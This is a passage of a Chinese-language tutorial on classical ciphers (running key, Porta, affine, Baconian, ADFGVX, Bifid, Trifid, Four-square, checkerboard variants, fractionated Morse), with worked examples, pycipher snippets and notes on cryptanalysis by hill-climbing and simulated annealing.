<h4 id="13-滚动密钥密码"><a href="#13-滚动密钥密码" class="headerlink" title="13.滚动密钥密码"></a>13.滚动密钥密码</h4><p><strong>（1）介绍</strong></p>
<p>滚动密钥密码(Running Key Cipher)和维吉尼亚密码有着相同的加密机制，区别是密钥的选取，维吉尼亚使用的密钥简短，而且重复循环使用，与之相反，滚动密钥密码使用很长的密钥，比如引用一本书作为密钥。这样做的目的是不重复循环使用密钥，使密文更难破译，尽管如此，滚动密钥密码还是可以被攻破，因为有关于密钥和明文的统计分析模式可供利用，如果滚动密钥密码使用统计上的随机密钥来源，那么理论上是不可破译的，因为任何可能都可以成为密钥，并且所有的可能性都是相等的。</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥：选取C语言编程(1978版)第63页第1行”errors can occur in several places. A label has…”，去掉非字母部分作为密钥(实际选取的密钥很长，长度至少不小于明文长度)。</p>
<p>加密过程：加密过程和维吉尼亚密码加密过程相同</p>
<p>密文:<code>XYV ELAEK OFQYH WWK BYHTJ OGTC TJI DAK YESR</code></p>
<p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="14-Porta密码"><a href="#14-Porta密码" class="headerlink" title="14.Porta密码"></a>14.Porta密码</h4><p><strong>（1）介绍</strong></p>
<p>Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点。</p>
<p>密表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">KEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</div><div class="line">----|----------------------------------------------------</div><div class="line">A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</div><div class="line">C,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K L</div><div class="line">E,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J K</div><div class="line">G,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I J</div><div class="line">I,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H I</div><div class="line">K,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G H</div><div class="line">M,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F G</div><div class="line">O,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E F</div><div class="line">Q,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D E</div><div class="line">S,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C D</div><div class="line">U,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B C</div><div class="line">W,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A B</div><div class="line">Y,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A</div></pre></td></tr></table></figure>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p>
<p>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。</p>
<p>密文：<code>FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV</code></p>
<p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="external">传送门</a></p>
<p><strong>（2）破解</strong></p>
<p>Porta密码可以被以<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher-part-2/" target="_blank" rel="external">维吉尼亚密码</a>破解相类似方式进行自动攻破，破解Porta密码第一步是先确定密钥长度，这里推荐一篇关于使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">重合指数算法</a>确定为维吉尼亚密钥长度<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="external">文章</a>。</p>
<hr>
<h4 id="15-同音替换密码"><a href="#15-同音替换密码" class="headerlink" title="15.同音替换密码"></a>15.同音替换密码</h4><p><strong>（1）介绍</strong></p>
<p>同音替换密码(Homophonic Substitution Cipher)是单字母可以被其他几种密文字母同时替换的密码，通常要比标准替换密码破解更加困难，破解标准替换密码最简单的方法就是分析字母出现频率，通常在英语中字母’E’(或’T’)出现的频率是最高的，如果我们允许字母’E’可以同时被3种不同字符代替，那么就不能还是以普通字母的频率来分析破解，如果允许可代替字符越多，那么密文就会更难破译。</p>
<p>常见代换规则表：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3163726836.png" alt="同音替换密码.png"></p>
<p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>密文(其中一种)：<code>6CZ KOVST XJ0MA EQY IOGL4 0W1J UC7 P9NB F0H</code></p>
<p><strong>（2）破解</strong></p>
<p>如果同音替换密码的同音词个数很多，那么破解它难度很大，通常的方法采取类似破解替换密码的”爬山算法”，除了找到一个明文字母映射几个字符之外，我们还需要确定映射了那些字符，可以尝试<a href="http://www.cs.sjsu.edu/faculty/stamp/RUA/homophonic.pdf" target="_blank" rel="external">2层嵌套”爬山算法”</a>来破解，外层确定映射的数量，内层确定映射字符。</p>
<hr>
<h4 id="16-仿射密码"><a href="#16-仿射密码" class="headerlink" title="16.仿射密码"></a>16.仿射密码</h4><p><strong>（1）介绍</strong></p>
<p>仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。每一个字母都是通过函数（ax + b）mod m加密，其中B是位移量，为了保证仿射密码的可逆性，a和m需要满足gcd(a , m)=1，一般m为设置为26。更多<a href="https://en.wikipedia.org/wiki/Affine_cipher" target="_blank" rel="external">参考</a></p>
<p>常见的字母对应关系：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/297129379.png" alt="常见的字母对应关系.png"></p>
<p>下面我们以E(x) = (5x + 8) mod 26函数为例子</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4130743045.png" alt="仿射密码.png"></p>
<p>至于解密我们知道</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3422534989.png" alt="仿射密码解密1.png"></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3535566502.png" alt="仿射密码解密2.png"></p>
<p>即可得出解密结果</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/2787731818.png" alt="仿射密码解密结果.png"></p>
<p>以E(x) = (5x + 8) mod 26加密，通过计算可得D(x)=21(x - 8) mod 26，这样便可以得到明文。</p>
<p>可参考的Python脚本</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/488561424.png" alt="仿射密码解密脚本.png"></p>
<p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="17-培根密码"><a href="#17-培根密码" class="headerlink" title="17.培根密码"></a>17.培根密码</h4><p><strong>（1）介绍</strong></p>
<p>培根密码(Baconian Cipher)是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由’A’和’B’组成序列替换明文(所以你当然也可以用别的字母)，比如字母’D’替换成”aaabb”，以下是全部的对应关系(另一种对于关系是每个字母都有唯一对应序列，I和J与U/V各自都有不同对应序列)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">A = aaaaa  I/J = abaaa  R = baaaa</div><div class="line"> </div><div class="line">B = aaaab  K = abaab    S = baaab</div><div class="line"> </div><div class="line">C = aaaba  L = ababa    T = baaba</div><div class="line"> </div><div class="line">D = aaabb  M = ababb    U/V = baabb</div><div class="line"> </div><div class="line">E = aabaa  N = abbaa    W = babaa</div><div class="line"> </div><div class="line">F = aabab  O = abbab    X = babab</div><div class="line"> </div><div class="line">G = aabba  P = abbba    Y = babba</div><div class="line"> </div><div class="line">H = aabbb  Q = abbbb    Z = babbb</div></pre></td></tr></table></figure>
<p>明文：<code>T H E F O X</code></p>
<p>密文：<code>baaba aabbb aabaa aabab abbab babab</code></p>
<p>加解密<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="18-ADFGX和ADFGVX密码"><a href="#18-ADFGX和ADFGVX密码" class="headerlink" title="18.ADFGX和ADFGVX密码"></a>18.ADFGX和ADFGVX密码</h4><p><strong>（1）ADFGX密码</strong></p>
<p>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</p>
<p>加密矩阵示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">    A  D  F  G   X</div><div class="line">  ----------------</div><div class="line">A | p  h  q  g   m </div><div class="line">D | e  a  y  n   o </div><div class="line">F | f  d  x  k   r</div><div class="line">G | c  v  s  z   w </div><div class="line">X | b  u  t  i/j l</div></pre></td></tr></table></figure>
<p>明文：<code>THE QUICK BROWN FOX</code></p>
<p>结果矩阵加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XF AD DA   AF XD XG GA FG   XA FX DX GX DG   FA DX FF</div></pre></td></tr></table></figure>
<p>列移位密钥：<code>how are u</code></p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/3686106504.png" alt="ADFGX密码.png"></p>
<p>密文：<code>DXADF AGXF XFFXD FXGGX DGFG AADA ADXXF</code></p>
<p>已知密钥加解密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import ADFGX</div><div class="line">&gt;&gt;&gt;a = ADFGX(&apos;phqgmeaynofdxkrcvszwbutil&apos;,&apos;HOWAREU&apos;)</div><div class="line">&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)</div><div class="line">&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;</div><div class="line">&gt;&gt;&gt;a.decipher(&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;)</div><div class="line">&apos;THEQUICKBROWNFOX&apos;</div></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/adfgx-cipher/" target="_blank" rel="external">传送门</a></p>
<p><strong>（2）ADFGVX密码</strong></p>
<p>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V，使得可以再使用10数字来替换明文。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">    A D F G V X</div><div class="line">  -------------</div><div class="line">A | p h 0 q g 6</div><div class="line">D | 4 m e a 1 y</div><div class="line">F | l 2 n o f d</div><div class="line">G | x k r 3 c v</div><div class="line">V | s 5 z w 7 b</div><div class="line">X | j 9 u t i 8</div></pre></td></tr></table></figure>
<p>由于两种加密过程完全类似这里就不再重复给出加密过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import ADFGVX</div><div class="line">&gt;&gt;&gt;a = ADFGVX(&apos;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&apos;,&apos;HOWAREU&apos;)</div><div class="line">&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)</div><div class="line">&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;</div><div class="line">&gt;&gt;&gt;a.decipher(&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;)</div><div class="line">&apos;THEQUICKBROWNFOX&apos;</div></pre></td></tr></table></figure>
<hr>
<h4 id="19-双密码"><a href="#19-双密码" class="headerlink" title="19.双密码"></a>19.双密码</h4><p><strong>（1）双密码</strong></p>
<p>双密码(Bifid Cipher)结合了波利比奥斯方阵换位密码，并采用分级实现扩散，这里的“双”是指用2个密钥进行加密。双密码是由法国Felix Delastelle发明，除此之外Felix Delastelle还发明了三分密码(Trifid Cipher)，四方密码(Four-Square Cipher)。还有一个<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="external">两方密码</a>(Two-Square)与四方密码类似，<a href="http://www.thonky.com/kryptos/cm-bifid-cipher" target="_blank" rel="external">共轭矩阵双密码</a>(Conjugated Matrix Bifid Cipher)也是双密码的变种。</p>
<p>示例密阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   1 2 3 4 5</div><div class="line">1| p h q g m</div><div class="line">2| e a y l n</div><div class="line">3| o f d x k</div><div class="line">4| r c v s z</div><div class="line">5| w b u t i/j</div></pre></td></tr></table></figure>
<p>明文:<code>THE QUICK BROWN FOX</code></p>
<p>经过密阵转换：</p>
<p>行:<code>512 15543 54352 333</code></p>
<p>列:<code>421 33525 21115 214</code></p>
<p>分组:</p>
<p><code>51215 54354 35233 3</code></p>
<p><code>42133 52521 11521 4</code></p>
<p>合并：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">5121542133 5435452521 3523311521 34</div></pre></td></tr></table></figure>
<p>在经过密阵转换后密文:<code>WETED TKZNE KYOME X</code></p>
<p><strong>（2）已知密阵加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import</div><div class="line">&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).encipher(&apos;THE QUICK BROWN FOX&apos;)</div><div class="line">&apos;WETEDTKZNEKYOMEX&apos;</div><div class="line">&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).decipher(&apos;WETEDTKZNEKYOMEX&apos;)</div><div class="line">&apos;THEQUICKBROWNFOX&apos;</div></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/" target="_blank" rel="external">传送门</a></p>
<p><strong>（3）未知密阵破解</strong></p>
<p>手工分析破解双密码是有一定难度的，每个字母都是同过3个数字进行非线性代替转换，而且之后还会对字母顺序进行打乱，这样使双密码比一些替换密码和换位密码更难破解。然而，现在是计算机时代，这张加密方式没有安全性可言，通过<a href="http://baike.baidu.com/link?url=mkceUr0W4L7B7UVQxc-dUkXKPJbj9v4YyBh_hrskt5iXk99UdnjW6mZ_YxoJO1PkT1zdjEZD2hd7TCMiSxpOma" target="_blank" rel="external">模拟退火</a>算法就能快速找到双密码的密阵。</p>
<p>这里推荐一篇详细的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-bifid-cipher/" target="_blank" rel="external">双密码破解分析</a>的文章，基于模拟退火算法实现的工具破解示例：</p>
<p>密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KWTAZQLAWWZCPONIVBTTBVQUZUGRNHAYIYGIAAYURCUQLDFTYVHTNQEENUPAIFCUNQTNGITEFUSHFDWHRIFSVTBISYDHHASQSROMUEVPQHHCCRBYTQBHWYRRHTEPEKHOBFSZUQBTSYRSQUDCSAOVUUGXOAUYWHPGAYHDNKEZPFKKWRIEHDWPEIOTBKESYETPBPOGTHQSPUMDOVUEQAUPCPFCQHRPHSOPQRSSLPEVWNIQDIOTSQESDHURIEREN</div></pre></td></tr></table></figure>
<p>解密：</p>
<p><img src="https://www.hackfun.org/usr/uploads/2016/07/4255378402.png" alt="双密码解密.png"></p>
<p>得到加密矩阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">G B C M K</div><div class="line">D H U E T</div><div class="line">L V Y W I</div><div class="line">X O Z S P</div><div class="line">N F A R Q</div></pre></td></tr></table></figure>
<p>明文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CRYPTANALYS IS OF BIFID BY HAND IS ACTUALLY FAIRLY DIFFICULT THE FRACTIONATING NATURE OF THE CIPHER IE EACH LETTER IS SUBSTITUTED BY CHARACTERS THEN THESE CHARACTERS ARE IUM BLED WHICH WILL PULL THEM APART MAKES THE CIPHER MUCH STRONGER THAN SUBSTITUTION CIPHERS OR TRANSPOSITION CIPHER SON THEIR OWN</div></pre></td></tr></table></figure>
<hr>
<h4 id="20-三分密码"><a href="#20-三分密码" class="headerlink" title="20.三分密码"></a>20.三分密码</h4><p>三分密码(Trifid Cipher)结合换位和替换，三分密码与双密码非常相似，差别之处就是用除了3×3×3的密阵代替5×5密阵。</p>
<p>示例密阵:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">密阵顺序 = EPSDUCVWYM.ZLKXNBTFGORIJHAQ      </div><div class="line">                          </div><div class="line">方阵 1      方阵 2      方阵 3                                     </div><div class="line">  1 2 3      1 2 3      1 2 3    </div><div class="line">1 E P S    1 M . Z    1 F G O    </div><div class="line">2 D U C    2 L K X    2 R I J    </div><div class="line">3 V W Y    3 N B T    3 H A Q</div></pre></td></tr></table></figure>
<p>明文:<code>THE QUICK BROWN FOX.</code></p>
<p>经过密阵转换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">T H E Q U I C K B R O W N F O X .</div><div class="line">2 3 1 3 1 3 1 2 2 3 3 1 2 3 3 2 2</div><div class="line">3 3 1 3 2 2 2 2 3 2 1 3 3 1 1 2 1</div><div class="line">3 1 1 3 2 2 3 2 2 1 3 2 1 1 3 3 2</div></pre></td></tr></table></figure>
<p>T(233)表示T在第一个方阵第三行第三列的位置</p>
<p>分组(分组密钥以5为例):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">THEQU ICKBR OWNFO X.</div><div class="line">23131 31223 31233 22</div><div class="line">33132 22232 13311 21</div><div class="line">31132 23221 32113 32</div></pre></td></tr></table></figure>
<p>合并：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">23131 33132 31132 31223 22232 23221 31233 13311 32113 22 21 32</div></pre></td></tr></table></figure>
<p>在经过密阵转换后密文:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">231313313231132312232223223221312331331132113222132</div><div class="line">N  O  O  N  W  G  B  X  X  L  G  H  H  W  S  K  W</div></pre></td></tr></table></figure>
<p>想要深入了解三分密码并破解三分密码的小伙伴推荐去看LANIKI教授的一篇密码课程章节的<a href="http://www.und.nodak.edu/org/crypto/crypto/lanaki.crypt.class/lessons/lesson17.zip" target="_blank" rel="external">讲义</a>。</p>
<hr>
<h4 id="21-四方密码"><a href="#21-四方密码" class="headerlink" title="21.四方密码"></a>21.四方密码</h4><p><strong>（1）介绍</strong></p>
<p>四方密码(Four-Square Cipher)是类似普莱菲尔密码双字母加密密码，这样使加密效果强于其他替换密码，因为频率分析变得更加困难了。</p>
<p>四方密码使用4个预先设置的5×5字母矩阵，每个矩阵包括25个字母，通常字母’j’被融入到’i’中(维基百科上说’q’被忽略，不过这不重要，因为’q’和’j’都是很少出现的字母)，通常左上和右下矩阵式是标准字母排序明文矩阵，右上和左下矩阵是打乱顺序的密钥矩阵。</p>
<p>示例矩阵：</p>
<p>![四方密码.png][47]</p>
<p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p>
<p>整理明文(分组不够时用’X’填充)：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p>
<p>加密过程：分别在明文矩阵中找到’TH’，分别找到他们在右上矩阵有左下矩阵的交点字母’ES’就是密文，以此类推。</p>
<p>密文：<code>ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ</code></p>
<p><strong>（2）已知密钥矩阵加解密</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from pycipher import Foursquare</div><div class="line">&gt;&gt;&gt;fs = Foursquare(&apos;zgptfoihmuwdrcnykeqaxvsbl&apos;,&apos;mfnbdcrhsaxyogvituewlqzkp&apos;)</div><div class="line">&gt;&gt;&gt;fs.encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)</div><div class="line">&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;</div><div class="line">&gt;&gt;&gt;fs.decipher(&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;)</div><div class="line">&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</div></pre></td></tr></table></figure>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/" target="_blank" rel="external">传送门</a></p>
<p><strong>（3）未知密钥矩阵破解</strong></p>
<p>推荐一篇关于采用<a href="http://blog.csdn.net/xianlingmao/article/details/7798647" target="_blank" rel="external">模拟退火算法</a>的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="external">四方密码分析</a>文章，如果有足够多的密文那么四方密码可以轻易被破解，如果知道了明文和密文推出密钥是很容易的，猜测部分明文是一个有效的方法去破解四方密码，如果一部分明文已知或者可以被猜测出</p>
<p>那么我们首先要确定尽可能多可利用的密钥，然后才可以进行更多的推测或者用其他的方法破译。基于四方密码分析一文实现的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="external">C代码</a>破解示例：</p>
<p>密文(密文最好在200个字符以上)：</p>
<p>HMMKEQESDTMDHLAWFWMNKSOSFOMRFNLWLKHNSQGGEKXEOLLVDXNRSQQGARTFKSAVNUDLFNDHESPZGQ</p>
<p>TWESAGPGSQSQSTPKUSBBQLQHESAGPGSQSQGXLNAVHTPMHMKKNYGSUGDMTPDGFNKYAVHXLWGEKRILESLZ</p>
<p>ZOFNAVIHRHRKAGHSMYUGEGNSRGAVMVOQPRLNKRXLMYLQPXILESQYBNRHRKAGKYQXDIHMPGPYOERZOLBEZ</p>
<p>LURFWLWUOLDDPNSQYAGMUQPQWESBEZVEQESDTMDBQLWDIUSHB</p>
<p>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -O3 -lm foursquarecrack2.c scoreText_2.c -o fsc</div><div class="line">./fsc</div></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Running foursquarecrack, this could take a few minutes... </div><div class="line">best score so far: -1239.505249, on iteration 1</div><div class="line">Key: &apos;KFMLUGWSQEPOZTNRBHDAVXCIY&apos;,&apos;UGSVKFIZMOYXPQRWTHLNCABED&apos;     </div><div class="line">plaintext: &apos;THECIPHERTEXTSQUARESCANBEGENERATEDUSINGAKEYWORDDROPPINGDUPLICAT</div><div class="line">            ELETTERSTHENFILLTHEREMAININGSPACESWITHTHEREMAININGLETTERSOFTHEA</div><div class="line">            LPHABETINORDERALTERNATIVELYTHECIPHERTEXTSQUARESCANBEGENERATEDCO</div><div class="line">            MPLETELYRANDOMLYTHEFOURSQUAREALGORITHMALLOWSFORTWOSEPARATEKEYSO</div><div class="line">            NEFOREACHOFTHETWOCIPHERTEXTMATRICESX&apos;</div></pre></td></tr></table></figure>
<hr>
<h4 id="22-棋盘密码"><a href="#22-棋盘密码" class="headerlink" title="22.棋盘密码"></a>22.棋盘密码</h4><p>棋盘密码（Checkerboard Cipher)是使用一个波利比奥斯方阵和两个密钥作为密阵的替换密码，通常在波利比奥斯方阵中J字母往往被包含在I字母中。</p>
<p>示例密阵：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">   Q  U  I  C  K</div><div class="line">  --------------</div><div class="line">B |K  N I/J G  H</div><div class="line">R |P  Q  R  S  T</div><div class="line">O |O  Y  Z  U  A</div><div class="line">W |M  X  W  V  B</div><div class="line">N |L  F  E  D  C</div></pre></td></tr></table></figure>
<p>经过密阵替换:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O  X</div><div class="line">密文:RK BK RU OC OC BI NK BQ WK RI OQ WI BU NU OQ WU</div></pre></td></tr></table></figure>
<hr>
<h4 id="23-跨棋盘密码"><a href="#23-跨棋盘密码" class="headerlink" title="23.跨棋盘密码"></a>23.跨棋盘密码</h4><p>跨棋盘密码(Straddle Checkerboard Cipher)是一种替换密码，当这种密码在结合其他加密方式，加密效果会更好。</p>
<p>棋盘示例(选择3和7作为变换):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">   0 1 2 3 4 5 6 7 8 9</div><div class="line">   f k m   c p d   y e</div><div class="line">3: h b i g q r o s a z</div><div class="line">7: l u t j n w v x</div></pre></td></tr></table></figure>
<p>明文: <code>T H E Q U I C K B R O W N F O X</code></p>
<p>经过加密棋盘替换得到密文:<code>72 30 9 34 71 32 4 1 31 35 36 75 74 0 36 77</code></p>
<p>当然我们还可以继续用其他的加密方式在对跨棋盘密码加密出的结果再进行加密:</p>
<p>示例变换密钥:83729</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">8372983729837298372983729837</div><div class="line">+7230934713241313536757403677</div><div class="line">-----------------------------</div><div class="line"> 5502817432078501808630122404</div></pre></td></tr></table></figure>
<p>在经过棋盘转换后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">5502817432078501808630122404</div><div class="line">ppfmyk n if  pfkyfyd hkmmcfc</div></pre></td></tr></table></figure>
<p>最终得到密文: ppfmyk n if  pfkyfyd hkmmcfc</p>
<p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/" target="_blank" rel="external">传送门</a></p>
<hr>
<h4 id="24-分组摩尔斯替换密码"><a href="#24-分组摩尔斯替换密码" class="headerlink" title="24.分组摩尔斯替换密码"></a>24.分组摩尔斯替换密码</h4><p>分组摩尔斯替换密码(Fractionated Morse Cipher)首先把明文转换为莫尔斯电码，不过每个字母之间用<code>x</code>分开，每个单词用<code>xx</code>分开。然后使用密钥生成一个替换密表，这个密表包含所有<code>. - x</code>组合的情况(因为不会出现<code>xxx</code>的情况，所以一共26种组合)。</p>
<p>密钥:<code>MORSECODE</code></p>
<p>密表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">MORSECDABFGHIJKLNPQTUVWXYZ</div><div class="line">.........---------XXXXXXXX</div><div class="line">...---XXX...---XXX...---XX</div><div class="line">.-X.-X.-X.-X.-X.-X.-X.-X.-</div></pre></td></tr></table></figure>
<p>说明:密表下半部分是固定的，密表的安全性以及加密效果主要取决于使用的密钥。</p>
